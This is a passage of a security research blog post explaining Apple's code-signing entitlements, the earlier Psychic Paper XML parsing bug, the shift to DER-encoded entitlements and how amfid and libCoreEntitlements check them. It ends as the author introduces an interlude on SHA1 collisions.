 <p class="wUhACgDjbS-c1"><span>Last year, I spent a lot of time researching the security of applications built on top of </span><span class="wUhACgDjbS-c15"><a class="wUhACgDjbS-c181" href="https://en.wikipedia.org/wiki/XMPP">XMPP</a></span><span>, an instant messaging protocol based on XML. More specifically, my research focused on how subtle quirks in XML parsing can be used to undermine the security of such applications. (If you are interested in learning more about that research, I did a talk on it at Black Hat USA 2022. The slides and the recording can be found </span><span class="wUhACgDjbS-c15"><a class="wUhACgDjbS-c181" href="https://www.blackhat.com/us-22/briefings/schedule/index.html#xmpp-stanza-smuggling-or-how-i-hacked-zoom-26618">here</a></span><span>&nbsp;and </span><span class="wUhACgDjbS-c15"><a class="wUhACgDjbS-c181" href="https://www.youtube.com/watch?v=ERaRNsvCBrw">here</a></span><span class="wUhACgDjbS-c6">).</span></p>
 <p class="wUhACgDjbS-c1 wUhACgDjbS-c12"><span class="wUhACgDjbS-c6"></span></p>
 <p class="wUhACgDjbS-c1"><span>At some point, when a part of my research was published, people pointed out other examples (unrelated to XMPP) where quirks in XML parsing led to security vulnerabilities. One of those examples was a vulnerability dubbed </span><span class="wUhACgDjbS-c15"><a class="wUhACgDjbS-c181" href="https://blog.siguza.net/psychicpaper/">Psychic Paper</a></span><span>, a really neat vulnerability in the way Apple operating system checks what </span><span class="wUhACgDjbS-c29">entitlements</span><span class="wUhACgDjbS-c6">&nbsp;an application has.</span></p>
 <p class="wUhACgDjbS-c1 wUhACgDjbS-c12"><span class="wUhACgDjbS-c6"></span></p>
 <p class="wUhACgDjbS-c1"><span>Entitlements are one of the core security concepts of Apple&rsquo;s operating systems. As </span><span class="wUhACgDjbS-c15"><a class="wUhACgDjbS-c181" href="https://developer.apple.com/documentation/bundleresources/entitlements?language=objc">Apple&rsquo;s documentation</a></span><span class="wUhACgDjbS-c6">&nbsp;explains, &ldquo;An entitlement is a right or privilege that grants an executable particular capabilities.&rdquo; For example, an application on an Apple operating system can&rsquo;t debug another application without possessing proper entitlements, even if those two applications run as the same user. Even applications running as root can&rsquo;t perform all actions (such as accessing some of the kernel APIs) without appropriate entitlements.</span></p>
 <p class="wUhACgDjbS-c1 wUhACgDjbS-c12"><span class="wUhACgDjbS-c6"></span></p>
 <p class="wUhACgDjbS-c1"><span>Psychic Paper was a vulnerability in the way entitlements were checked. Entitlements were stored inside the application&rsquo;s signature blob in the XML format, so naturally the operating system needed to parse those at some point using an XML parser. The problem was that the OS didn&rsquo;t have a single parser for this, but rather a staggering four parsers that were used in different places in the operating system. One parser was used for the initial check that the application only has permitted entitlements, and a different parser was later used when checking whether the application has an entitlement to perform a specific action</span><span>.</span></p>
 <p class="wUhACgDjbS-c1 wUhACgDjbS-c12"><span class="wUhACgDjbS-c6"></span></p>
 <p class="wUhACgDjbS-c1"><span class="wUhACgDjbS-c6">When giving my talk on XMPP, I gave a challenge to the audience: Find me two different XML parsers that always, for every input, result in the same output. The reason why that is difficult is because XML, although intended to be a simple format, in reality is anything but simple. So it shouldn&rsquo;t come as a surprise that a way was found for one of Apple&#39;s XML parsers to return one set of entitlements and another parser to see a different set of entitlements when parsing the same entitlements blob.</span></p>
 <p class="wUhACgDjbS-c1 wUhACgDjbS-c12"><span class="wUhACgDjbS-c6"></span></p>
 <p class="wUhACgDjbS-c1"><span class="wUhACgDjbS-c6">The fix for the Psychic Paper bug: originally, the problem occurred because Apple had four XML parsers in the OS, so, surprisingly, the fix was to add a fifth one.</span></p>
 <p class="wUhACgDjbS-c1 wUhACgDjbS-c12"><span class="wUhACgDjbS-c6"></span></p>
 <p class="wUhACgDjbS-c1"><span class="wUhACgDjbS-c6">So, after my XMPP research, when I learned about the Psychic Paper bug, I decided to take a look at these XML parsers and see if I can somehow find another way to trigger the bug even after the fix. After playing with various Apple XML parsers, I had an XML snippet I wanted to try out. However when I actually tried to use it in an application, I discovered that the system for checking entitlements behaved completely differently than I thought. This was because of&hellip;</span></p><h2 class="wUhACgDjbS-c9" id="h.143u383vs24"><span class="wUhACgDjbS-c11 wUhACgDjbS-c21">DER Entitlements</span></h2>
 <p class="wUhACgDjbS-c1"><span>According to </span><span class="wUhACgDjbS-c15"><a class="wUhACgDjbS-c181" href="https://developer.apple.com/documentation/xcode/using-the-latest-code-signature-format">Apple developer documentation</a></span><span>, &ldquo;Starting in iOS 15, iPadOS 15, tvOS 15, and watchOS 8, the system checks for a new, more secure signature format that uses Distinguished Encoding Rules, or DER, to embed entitlements into your app&rsquo;s signature&rdquo;. As </span><span class="wUhACgDjbS-c15"><a class="wUhACgDjbS-c181" href="https://developer.apple.com/documentation/technotes/tn3125-inside-code-signing-provisioning-profiles#The-future-is-DER">another Apple article</a></span><span class="wUhACgDjbS-c6">&nbsp;boldly proclaims, &ldquo;The future is DER&rdquo;.</span></p>
 <p class="wUhACgDjbS-c1 wUhACgDjbS-c12"><span class="wUhACgDjbS-c6"></span></p>
 <p class="wUhACgDjbS-c1"><span class="wUhACgDjbS-c6">So, what is DER?</span></p>
 <p class="wUhACgDjbS-c1 wUhACgDjbS-c12"><span class="wUhACgDjbS-c6"></span></p>
 <p class="wUhACgDjbS-c1"><span>Unlike the previous text-based XML format, </span><span class="wUhACgDjbS-c15"><a class="wUhACgDjbS-c181" href="https://en.wikipedia.org/wiki/X.690#DER_encoding">DER</a></span><span>&nbsp;is a binary format, also commonly used in digital certificates. The format is specified in the </span><span class="wUhACgDjbS-c15"><a class="wUhACgDjbS-c181" href="https://www.itu.int/ITU-T/studygroups/com17/languages/X.690-0207.pdf">X.690 standard</a></span><span class="wUhACgDjbS-c6">.</span></p>
 <p class="wUhACgDjbS-c1 wUhACgDjbS-c12"><span class="wUhACgDjbS-c6"></span></p>
 <p class="wUhACgDjbS-c1"><span class="wUhACgDjbS-c6">DER follows relatively simple type-length-data encoding rules. An image from the specification illustrates that:</span></p>
 <p class="wUhACgDjbS-c1 wUhACgDjbS-c12"><span class="wUhACgDjbS-c6"></span></p>
 <p class="wUhACgDjbS-c1"></p>
 <p class="wUhACgDjbS-c1"><span class="wUhACgDjbS-c6"><a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh_ctQx4QBRr-XKiIsWHuUO3d6r1cbG935MHyu2EXDNwm1tWeaGC1A5yniZErHOJ8qqwg185tDe6tU4u8ObWuPf-0CnLI9Pk5QhdQBOKcK6YAzqg30Xz1cuDtkcX9ryZ70vGbk3JKVwwkB0ozGkW6jqEIl-Q7jpeQZTM0PXmGtbsB7g1ApOut3xBwOX/s599/image2.png" style="display: block; padding: 1em 0;text-align: center;"><img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh_ctQx4QBRr-XKiIsWHuUO3d6r1cbG935MHyu2EXDNwm1tWeaGC1A5yniZErHOJ8qqwg185tDe6tU4u8ObWuPf-0CnLI9Pk5QhdQBOKcK6YAzqg30Xz1cuDtkcX9ryZ70vGbk3JKVwwkB0ozGkW6jqEIl-Q7jpeQZTM0PXmGtbsB7g1ApOut3xBwOX/s599/image2.png" border="0" alt="" style="max-height: 750px; max-width: 600px;"title="" /></a></span></p>
 <p class="wUhACgDjbS-c1 wUhACgDjbS-c12"><span class="wUhACgDjbS-c6"></span></p>
 <p class="wUhACgDjbS-c1"><span>The Identifier field encodes the object type, which can be a primitive (e.g. a string or a boolean), but also a </span><span class="wUhACgDjbS-c29">constructed</span><span class="wUhACgDjbS-c6">&nbsp;type (an object containing other objects, e.g. an array/sequence). The length field encodes the number of bytes in the content. Length can be encoded differently, depending on the length of content (e.g. if content is smaller than 128 bytes, then the length field only takes a single byte). Length field is followed by the content itself. In case of constructed types, the content is also encoded using the same encoding rules.</span></p>
 <p class="wUhACgDjbS-c1 wUhACgDjbS-c12"><span class="wUhACgDjbS-c6"></span></p>
 <p class="wUhACgDjbS-c1"><span>An </span><span class="wUhACgDjbS-c15"><a class="wUhACgDjbS-c181" href="https://developer.apple.com/documentation/technotes/tn3125-inside-code-signing-provisioning-profiles#The-future-is-DER">example from Apple developer documentation</a></span><span class="wUhACgDjbS-c6">&nbsp;shows what DER-encoded entitlements might look like:</span></p>
 <p class="wUhACgDjbS-c1 wUhACgDjbS-c12"><span class="wUhACgDjbS-c6"></span></p><a id="t.b0d92d5a95e353be337a6acc5beb2363c4a55559"></a><a id="t.0"></a><table class="wUhACgDjbS-c16"><tr class="wUhACgDjbS-c14"><td class="wUhACgDjbS-c33" colspan="1" rowspan="1">
 <p class="wUhACgDjbS-c10"><span class="wUhACgDjbS-c5 wUhACgDjbS-c13">appl </span><span class="wUhACgDjbS-c0">[</span><span class="wUhACgDjbS-c5 wUhACgDjbS-c13">&nbsp;</span><span class="wUhACgDjbS-c5 wUhACgDjbS-c24">16</span><span class="wUhACgDjbS-c5 wUhACgDjbS-c13">&nbsp;</span><span class="wUhACgDjbS-c0">]</span><span class="wUhACgDjbS-c11 wUhACgDjbS-c5">&nbsp; &nbsp; &nbsp; &nbsp;</span></p>
 <p class="wUhACgDjbS-c10"><span class="wUhACgDjbS-c5 wUhACgDjbS-c13">&nbsp;INTEGER &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="wUhACgDjbS-c0">:</span><span class="wUhACgDjbS-c5 wUhACgDjbS-c24">01</span></p>
 <p class="wUhACgDjbS-c10"><span class="wUhACgDjbS-c5 wUhACgDjbS-c13">&nbsp;cont </span><span class="wUhACgDjbS-c0">[</span><span class="wUhACgDjbS-c5 wUhACgDjbS-c13">&nbsp;</span><span class="wUhACgDjbS-c5 wUhACgDjbS-c24">16</span><span class="wUhACgDjbS-c5 wUhACgDjbS-c13">&nbsp;</span><span class="wUhACgDjbS-c0">]</span><span class="wUhACgDjbS-c11 wUhACgDjbS-c5">&nbsp; &nbsp; &nbsp; &nbsp;</span></p>
 <p class="wUhACgDjbS-c10"><span class="wUhACgDjbS-c11 wUhACgDjbS-c5">&nbsp; SEQUENCE &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;</span></p>
 <p class="wUhACgDjbS-c10"><span class="wUhACgDjbS-c5 wUhACgDjbS-c13">&nbsp; &nbsp;UTF8STRING &nbsp; &nbsp; &nbsp; &nbsp;</span><span class="wUhACgDjbS-c0">:</span><span class="wUhACgDjbS-c5 wUhACgDjbS-c13">application</span><span class="wUhACgDjbS-c0">-</span><span class="wUhACgDjbS-c11 wUhACgDjbS-c5">identifier</span></p>
 <p class="wUhACgDjbS-c10"><span class="wUhACgDjbS-c5 wUhACgDjbS-c13">&nbsp; &nbsp;UTF8STRING &nbsp; &nbsp; &nbsp; &nbsp;</span><span class="wUhACgDjbS-c0">:</span><span class="wUhACgDjbS-c5 wUhACgDjbS-c13">SKMME9E2Y8</span><span class="wUhACgDjbS-c0">.</span><span class="wUhACgDjbS-c5 wUhACgDjbS-c13">com</span><span class="wUhACgDjbS-c0">.</span><span class="wUhACgDjbS-c5 wUhACgDjbS-c13">example</span><span class="wUhACgDjbS-c0">.</span><span class="wUhACgDjbS-c5 wUhACgDjbS-c13">apple</span><span class="wUhACgDjbS-c0">-</span><span class="wUhACgDjbS-c5 wUhACgDjbS-c13">samplecode</span><span class="wUhACgDjbS-c0">.</span><span class="wUhACgDjbS-c5 wUhACgDjbS-c8">ProfileExplainer</span></p>
 <p class="wUhACgDjbS-c10"><span class="wUhACgDjbS-c11 wUhACgDjbS-c5">&nbsp; SEQUENCE &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;</span></p>
 <p class="wUhACgDjbS-c10"><span class="wUhACgDjbS-c5 wUhACgDjbS-c13">&nbsp; &nbsp;UTF8STRING &nbsp; &nbsp; &nbsp; &nbsp;</span><span class="wUhACgDjbS-c0">:</span><span class="wUhACgDjbS-c5 wUhACgDjbS-c13">com</span><span class="wUhACgDjbS-c0">.</span><span class="wUhACgDjbS-c5 wUhACgDjbS-c13">apple</span><span class="wUhACgDjbS-c0">.</span><span class="wUhACgDjbS-c5 wUhACgDjbS-c13">developer</span><span class="wUhACgDjbS-c0">.</span><span class="wUhACgDjbS-c5 wUhACgDjbS-c13">team</span><span class="wUhACgDjbS-c0">-</span><span class="wUhACgDjbS-c11 wUhACgDjbS-c5">identifier</span></p>
 <p class="wUhACgDjbS-c10"><span class="wUhACgDjbS-c5 wUhACgDjbS-c13">&nbsp; &nbsp;UTF8STRING &nbsp; &nbsp; &nbsp; &nbsp;</span><span class="wUhACgDjbS-c0">:</span><span class="wUhACgDjbS-c11 wUhACgDjbS-c5">SKMME9E2Y8</span></p>
 <p class="wUhACgDjbS-c10"><span class="wUhACgDjbS-c11 wUhACgDjbS-c5">&nbsp; SEQUENCE &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;</span></p>
 <p class="wUhACgDjbS-c10"><span class="wUhACgDjbS-c5 wUhACgDjbS-c13">&nbsp; &nbsp;UTF8STRING &nbsp; &nbsp; &nbsp; &nbsp;</span><span class="wUhACgDjbS-c0">:</span><span class="wUhACgDjbS-c5 wUhACgDjbS-c17">get</span><span class="wUhACgDjbS-c0">-</span><span class="wUhACgDjbS-c5 wUhACgDjbS-c13">task</span><span class="wUhACgDjbS-c0">-</span><span class="wUhACgDjbS-c11 wUhACgDjbS-c5">allow</span></p>
 <p class="wUhACgDjbS-c10"><span class="wUhACgDjbS-c5 wUhACgDjbS-c13">&nbsp; &nbsp;BOOLEAN &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="wUhACgDjbS-c0">:</span><span class="wUhACgDjbS-c5 wUhACgDjbS-c24">255</span></p>
 <p class="wUhACgDjbS-c10"><span class="wUhACgDjbS-c11 wUhACgDjbS-c5">&nbsp; SEQUENCE &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;</span></p>
 <p class="wUhACgDjbS-c10"><span class="wUhACgDjbS-c5 wUhACgDjbS-c13">&nbsp; &nbsp;UTF8STRING &nbsp; &nbsp; &nbsp; &nbsp;</span><span class="wUhACgDjbS-c0">:</span><span class="wUhACgDjbS-c5 wUhACgDjbS-c13">keychain</span><span class="wUhACgDjbS-c0">-</span><span class="wUhACgDjbS-c5 wUhACgDjbS-c13">access</span><span class="wUhACgDjbS-c0">-</span><span class="wUhACgDjbS-c11 wUhACgDjbS-c5">groups</span></p>
 <p class="wUhACgDjbS-c10"><span class="wUhACgDjbS-c11 wUhACgDjbS-c5">&nbsp; &nbsp;SEQUENCE &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;</span></p>
 <p class="wUhACgDjbS-c10"><span class="wUhACgDjbS-c5 wUhACgDjbS-c13">&nbsp; &nbsp; UTF8STRING &nbsp; &nbsp; &nbsp; &nbsp;</span><span class="wUhACgDjbS-c0">:</span><span class="wUhACgDjbS-c5 wUhACgDjbS-c13">SKMME9E2Y8</span><span class="wUhACgDjbS-c0">.*</span></p>
 <p class="wUhACgDjbS-c10"><span class="wUhACgDjbS-c5 wUhACgDjbS-c13">&nbsp; &nbsp; UTF8STRING &nbsp; &nbsp; &nbsp; &nbsp;</span><span class="wUhACgDjbS-c0">:</span><span class="wUhACgDjbS-c5 wUhACgDjbS-c13">com</span><span class="wUhACgDjbS-c0">.</span><span class="wUhACgDjbS-c5 wUhACgDjbS-c13">apple</span><span class="wUhACgDjbS-c0">.</span><span class="wUhACgDjbS-c5 wUhACgDjbS-c13">token</span></p></td></tr></table>
 <p class="wUhACgDjbS-c1 wUhACgDjbS-c12"><span class="wUhACgDjbS-c6"></span></p>
 <p class="wUhACgDjbS-c1"><span>Each individual entitlement is a sequence which has two elements: a key and a value, e.g. &ldquo;get-task-allow&rdquo;:boolean(true). All entitlements are also a part of a constructed type (denoted as &ldquo;</span><span class="wUhACgDjbS-c4">cont [ 16 ]</span><span class="wUhACgDjbS-c6">&rdquo; in the listing).</span></p>
 <p class="wUhACgDjbS-c1 wUhACgDjbS-c12"><span class="wUhACgDjbS-c6"></span></p>
 <p class="wUhACgDjbS-c1"><span class="wUhACgDjbS-c6">DER is meant to have unique binary representation and replacing XML with DER was very likely motivated, at least in part, by preventing issues such as Psychic Paper. But does it necessarily succeed in that goal?</span></p><h2 class="wUhACgDjbS-c9" id="h.xx7qiyjgj2wn"><span>How entitlements are checked</span></h2>
 <p class="wUhACgDjbS-c1"><span class="wUhACgDjbS-c6">To understand how entitlements are checked, it is useful to also look at the bigger picture and understand what security/integrity checks Apple operating systems perform on binaries before (and in some cases, while) running them.</span></p>
 <p class="wUhACgDjbS-c1 wUhACgDjbS-c12"><span class="wUhACgDjbS-c6"></span></p>
 <p class="wUhACgDjbS-c1"><span>Integrity information in Apple binaries is stored in a structure called the </span><span class="wUhACgDjbS-c15"><a class="wUhACgDjbS-c181" href="https://github.com/apple-oss-distributions/Security/blob/e4ea024c9bbd3bfda30ec6df270bfb4c7438d1a9/OSX/libsecurity_codesigning/lib/sigblob.h#L43">Embedded Signature Blob</a></span><span class="wUhACgDjbS-c6">. This structure is a container for various other structures that play a role in integrity checking: The digital signature itself, but also entitlements and an important structure called the Code Directory. The Code Directory contains a hash of every page in the binary (up to the Signature Blob), but also other information, including the hash of the entitlements blob. The hash of the CodeDirectory is called cdHash and it is used to uniquely identify the binary. For example, it is cdHash that the digital signature actually signs. Since Code Directory contains a hash of the entitlements blob, note that any change to entitlements will lead to cdHash being different.</span></p>
 <p class="wUhACgDjbS-c1 wUhACgDjbS-c12"><span class="wUhACgDjbS-c6"></span></p>
 <p class="wUhACgDjbS-c1"><span class="wUhACgDjbS-c6">As also noted in the Psychic Paper writeup, there are several ways a binary might be signed:</span></p><ul style="padding: 0;" class="c25 lst-kix_o4b5kflpgafe-0 start"><li style="margin-left: 46pt;" class="c1 c19 li-bullet-0"><span class="wUhACgDjbS-c6">The cdHash of the binary could be in the system&rsquo;s Trust Cache, which stores the hashes of system binaries.</span></li><li style="margin-left: 46pt;" class="c1 c19 li-bullet-0"><span class="wUhACgDjbS-c6">The binary could be signed by the Apple App Store.</span></li><li style="margin-left: 46pt;" class="c1 c19 li-bullet-0"><span>The binary could be signed by the developer, but in that case it must reference a &ldquo;Provisioning Profile&rdquo; signed by Apple.</span></li><li style="margin-left: 46pt;" class="c1 c19 li-bullet-0"><span class="wUhACgDjbS-c6">On macOS only, a binary could also be self-signed.</span></li></ul>
 <p class="wUhACgDjbS-c1 wUhACgDjbS-c2"><span class="wUhACgDjbS-c6"></span></p>
 <p class="wUhACgDjbS-c1"><span class="wUhACgDjbS-c6">We are mostly interested in the last two cases, because they are the only ones that allow us to provide custom entitlements. However, in those cases, any entitlements a binary has must either be a subset of those allowed by the provisioning profile created by Apple (in the &ldquo;provisioning profile&rdquo; case) or entitlements must only contain those whitelisted by the OS (in the self-signed case). That is, unless one has a vulnerability like Psychic Paper.</span></p>
 <p class="wUhACgDjbS-c1 wUhACgDjbS-c12"><span class="wUhACgDjbS-c6"></span></p>
 <p class="wUhACgDjbS-c1"><span>An entrypoint into file integrity checks is the </span><span class="wUhACgDjbS-c4">vnode_check_signature</span><span>&nbsp;function inside the </span><span class="wUhACgDjbS-c4">AppleMobileFileIntegrity</span><span>&nbsp;kernel extension. </span><span class="wUhACgDjbS-c4">AppleMobileFileIntegrity</span><span>&nbsp;is the kernel component of integrity checking, but there is also the userspace demon: </span><span class="wUhACgDjbS-c4">amfid</span><span>&nbsp;which </span><span class="wUhACgDjbS-c4">AppleMobileFileIntegrity</span><span class="wUhACgDjbS-c6">&nbsp;uses to perform certain actions as noted further in the text.</span></p>
 <p class="wUhACgDjbS-c1 wUhACgDjbS-c12"><span class="wUhACgDjbS-c6"></span></p>
 <p class="wUhACgDjbS-c1"><span>We are not going to analyze the full behavior of </span><span class="wUhACgDjbS-c4">vnode_check_signature</span><span class="wUhACgDjbS-c6">. However, I will highlight the most important actions and those relevant to understanding DER entitlements workflow:</span></p>
 <p class="wUhACgDjbS-c1 wUhACgDjbS-c12"><span class="wUhACgDjbS-c6"></span></p><ul style="padding: 0;" class="c25 lst-kix_mk2jd2ji027g-0 start"><li style="margin-left: 46pt;" class="c1 c19 li-bullet-0"><span>First, </span><span class="wUhACgDjbS-c4">vnode_check_signature </span><span>retrieves the entitlements in the DER format. If the currently loaded binary does not contain DER entitlements and only contains entitlements in the XML format, </span><span class="wUhACgDjbS-c4">AppleMobileFileIntegrity </span><span>calls </span><span class="wUhACgDjbS-c4">transmuteEntitlementsInDaemon</span><span>&nbsp;which uses </span><span class="wUhACgDjbS-c4">amfid</span><span>&nbsp;to convert entitlements from XML into DER format. The conversion itself is done via </span><span class="wUhACgDjbS-c4">CFPropertyListCreateWithData</span><span>&nbsp;(to convert XML to CFDictionary) and </span><span class="wUhACgDjbS-c4">CESerializeCFDictionary</span><span class="wUhACgDjbS-c6">&nbsp;(which converts CFDictionary to DER representation).</span></li></ul>
 <p class="wUhACgDjbS-c1 wUhACgDjbS-c2"><span class="wUhACgDjbS-c6"></span></p><ul style="padding: 0;" class="c25 lst-kix_mk2jd2ji027g-0"><li style="margin-left: 46pt;" class="c1 c19 li-bullet-0"><span>Checks on the signature are performed using the CoreTrust library by calling </span><span class="wUhACgDjbS-c4">CTEvaluateAMFICodeSignatureCMS</span><span>. This process has recently been documented in </span><span class="wUhACgDjbS-c15"><a class="wUhACgDjbS-c181" href="https://worthdoingbadly.com/coretrust/">another vulnerability writeup</a></span><span>&nbsp;and will not be examined in detail as it does not relate to entitlements directly</span><span class="wUhACgDjbS-c6">.</span></li></ul>
 <p class="wUhACgDjbS-c1 wUhACgDjbS-c12"><span class="wUhACgDjbS-c6"></span></p><ul style="padding: 0;" class="c25 lst-kix_mk2jd2ji027g-0"><li style="margin-left: 46pt;" class="c1 c19 li-bullet-0"><span>Additional checks on the signature and entitlements are performed in </span><span class="wUhACgDjbS-c4">amfid</span><span>&nbsp;via the </span><span class="wUhACgDjbS-c4">verify_code_directory</span><span>&nbsp;function. This call will be analyzed in-depth later. One interesting detail about this interaction is that </span><span class="wUhACgDjbS-c4">amfid</span><span>&nbsp;receives the path to the executable as a parameter. In order to prevent race conditions where the file was changed between being loaded by kernel and checked by </span><span class="wUhACgDjbS-c4">amfid</span><span>, </span><span class="wUhACgDjbS-c4">amfid</span><span class="wUhACgDjbS-c6">&nbsp;returns the cdHash of the checked file. It is then verified that this cdHash matches the cdHash of the file in the kernel.</span></li></ul>
 <p class="wUhACgDjbS-c1 wUhACgDjbS-c12"><span class="wUhACgDjbS-c6"></span></p><ul style="padding: 0;" class="c25 lst-kix_mk2jd2ji027g-0"><li style="margin-left: 46pt;" class="c1 c19 li-bullet-0"><span>Provisioning profile information is retrieved and it is checked that the entitlements in the binary are a subset of the entitlements in the provisioning profile. This is done with the </span><span class="wUhACgDjbS-c4">CEContextIsSubset</span><span>&nbsp;function. This step does not appear to be present on macOS running on Intel CPUs, however even in that case, the entitlements are still checked in </span><span class="wUhACgDjbS-c4">amfid</span><span class="wUhACgDjbS-c6">&nbsp;as will be shown below.</span></li></ul>
 <p class="wUhACgDjbS-c1 wUhACgDjbS-c12"><span class="wUhACgDjbS-c6"></span></p>
 <p class="wUhACgDjbS-c1"><span>The </span><span class="wUhACgDjbS-c4">verify_code_directory</span><span>&nbsp;function of </span><span class="wUhACgDjbS-c4">amfid</span><span class="wUhACgDjbS-c6">&nbsp;performs (among other things) the following actions:</span></p>
 <p class="wUhACgDjbS-c1 wUhACgDjbS-c12"><span class="wUhACgDjbS-c6"></span></p><ul style="padding: 0;" class="c25 lst-kix_n26z3gtxgors-0 start"><li style="margin-left: 46pt;" class="c1 c19 li-bullet-0"><span>Parses the binary and extracts all the relevant information for integrity checking. The code that does that is part of the open-source </span><span class="wUhACgDjbS-c15"><a class="wUhACgDjbS-c181" href="https://github.com/apple-oss-distributions/Security">Security</a></span><span>&nbsp;library and the two most relevant classes here are </span><span class="wUhACgDjbS-c15"><a class="wUhACgDjbS-c181" href="https://github.com/apple-oss-distributions/Security/blob/e4ea024c9bbd3bfda30ec6df270bfb4c7438d1a9/OSX/libsecurity_codesigning/lib/StaticCode.cpp">StaticCode</a></span><span>&nbsp;and </span><span class="wUhACgDjbS-c15"><a class="wUhACgDjbS-c181" href="https://github.com/apple-oss-distributions/Security/blob/e4ea024c9bbd3bfda30ec6df270bfb4c7438d1a9/OSX/libsecurity_codesigning/lib/SecStaticCode.cpp">SecStaticCode</a></span><span>. This code is also responsible for extracting the DER-encoded entitlements. Once again, if only XML-encoded entitlements are present, they get converted to DER format. This is, once again, done by the </span><span class="wUhACgDjbS-c4">CFPropertyListCreateWithData</span><span>&nbsp;and </span><span class="wUhACgDjbS-c4">CESerializeCFDictionary</span><span>&nbsp;pair of functions. Additionally, for later use, entitlements are also converted to CFDictionary representation. This conversion from DER to CFDictionary is done using the </span><span class="wUhACgDjbS-c4">CEManagedContextFromCFData</span><span>&nbsp;and </span><span class="wUhACgDjbS-c4">CEQueryContextToCFDictionary</span><span class="wUhACgDjbS-c6">&nbsp;function pair.</span></li></ul>
 <p class="wUhACgDjbS-c1 wUhACgDjbS-c2"><span class="wUhACgDjbS-c6"></span></p><ul style="padding: 0;" class="c25 lst-kix_n26z3gtxgors-0"><li style="margin-left: 46pt;" class="c1 c19 li-bullet-0"><span>Checks that the signature signs the correct cdHash and checks the signature itself. The checking of the digital signature certificate chain isn&rsquo;t actually done by the </span><span class="wUhACgDjbS-c4">amfid</span><span>&nbsp;process. </span><span class="wUhACgDjbS-c4">amfid</span><span>&nbsp;</span><span>call</span><span>s into </span><span class="wUhACgDjbS-c4">trustd</span><span class="wUhACgDjbS-c6">&nbsp;for that.</span></li></ul>
 <p class="wUhACgDjbS-c1 wUhACgDjbS-c12"><span class="wUhACgDjbS-c6"></span></p><ul style="padding: 0;" class="c25 lst-kix_n26z3gtxgors-0"><li style="margin-left: 46pt;" class="c1 c19 li-bullet-0"><span>On macOS, the entitlements contained in the binary are filtered into restricted and unrestricted ones. On macOS, the unrestricted entitlements are </span><span class="wUhACgDjbS-c4">com.apple.application-identifier</span><span>, </span><span class="wUhACgDjbS-c4">com.apple.security.application-groups*</span><span>, </span><span class="wUhACgDjbS-c4">com.apple.private.signing-identifier</span><span>&nbsp;and </span><span class="wUhACgDjbS-c4">com.apple.security.*</span><span>. If the binary contains </span><span>any entitlements</span><span>&nbsp;not listed above, it needs to be checked against a provisioning profile. The check here relies on the entitlements CFDictionary, extracted earlier in </span><span class="wUhACgDjbS-c4">amfid</span><span class="wUhACgDjbS-c6">.</span></li></ul>
 <p class="wUhACgDjbS-c1 wUhACgDjbS-c12"><span class="wUhACgDjbS-c6"></span></p>
 <p class="wUhACgDjbS-c1"><span>Later, when the binary runs, if the operating system wants to check that the binary contains an entitlement to perform a specific action, it can do this in several ways. The &ldquo;old way&rdquo; of doing this is to retrieve a dictionary representation of entitlements and query a dictionary for a specific key. However, there is also a new API for querying entitlements, where the caller first creates a </span><span class="wUhACgDjbS-c4">CEQuery</span><span>&nbsp;object containing the entitlement key they want to query (and, optionally, the expected value) and then performs the query by calling </span><span class="wUhACgDjbS-c4">CEContextQuery</span><span>&nbsp;function with the </span><span class="wUhACgDjbS-c4">CEQuery</span><span>&nbsp;object as a parameter. For example, the </span><span class="wUhACgDjbS-c4">IOTaskHasEntitlement</span><span class="wUhACgDjbS-c6">&nbsp;function, which takes an entitlement name and returns bool relies on the latter API.</span></p><h2 class="wUhACgDjbS-c9" id="h.a9n48gmjlgpm"><span>libCoreEntitlements</span></h2>
 <p class="wUhACgDjbS-c1"><span>You might have noticed that a lot of functions for interacting with DER entitlements start with the letters &ldquo;CE&rdquo;, such as </span><span class="wUhACgDjbS-c4">CEQueryContextToCFDictionary</span><span>&nbsp;or </span><span class="wUhACgDjbS-c4">CEContextQuery</span><span>. Here, CE stands for libCoreEntitlements, which is a new library created specifically for DER-encoded entitlements. libCoreEntitlements is present both in the userspace (as libCoreEntitlements.dylib) and in the OS kernel (as a part of </span><span class="wUhACgDjbS-c4">AppleMobileFileIntegrity</span><span class="wUhACgDjbS-c6">&nbsp;kernel extension). So any vulnerability related to parsing the DER entitlement format would be located there.</span></p>
 <p class="wUhACgDjbS-c1 wUhACgDjbS-c12"><span class="wUhACgDjbS-c6"></span></p>
 <p class="wUhACgDjbS-c1"><span class="wUhACgDjbS-c6">&ldquo;There are no vulnerabilities here&rdquo;, I declared in one of the Project Zero team meetings. At the time, I based this claim on the following:</span></p>
 <p class="wUhACgDjbS-c1 wUhACgDjbS-c12"><span class="wUhACgDjbS-c6"></span></p><ul style="padding: 0;" class="c25 lst-kix_h97ui6n3g8c8-0 start"><li style="margin-left: 46pt;" class="c1 c19 li-bullet-0"><span>There is a single library for parsing DER entitlements, unlike the </span><span>four</span><span class="wUhACgDjbS-c6">/five used for XML entitlements. While there are two versions of the library, in userspace and kernel, those appear to be the same. Thus, there is no potential for parsing differential bugs like Psychic Paper. In addition to this, binary formats are much less susceptible to such issues in the first place.</span></li></ul>
 <p class="wUhACgDjbS-c1 wUhACgDjbS-c2"><span class="wUhACgDjbS-c6"></span></p><ul style="padding: 0;" class="c25 lst-kix_h97ui6n3g8c8-0"><li style="margin-left: 46pt;" class="c1 c19 li-bullet-0"><span>The library is </span><span>quite</span><span class="wUhACgDjbS-c6">&nbsp;small. I both reviewed and fuzzed the library for memory corruption vulnerabilities and didn&rsquo;t find anything.</span></li></ul>
 <p class="wUhACgDjbS-c1 wUhACgDjbS-c12"><span class="wUhACgDjbS-c6"></span></p>
 <p class="wUhACgDjbS-c1"><span class="wUhACgDjbS-c6">It turns out I was completely wrong (as it often happens when someone declares code is bug free). But first&hellip;</span></p><h2 class="wUhACgDjbS-c9" id="h.oj2j45cupao4"><span class="wUhACgDjbS-c11 wUhACgDjbS-c21">Interlude: SHA1 Collisions</span></h2>
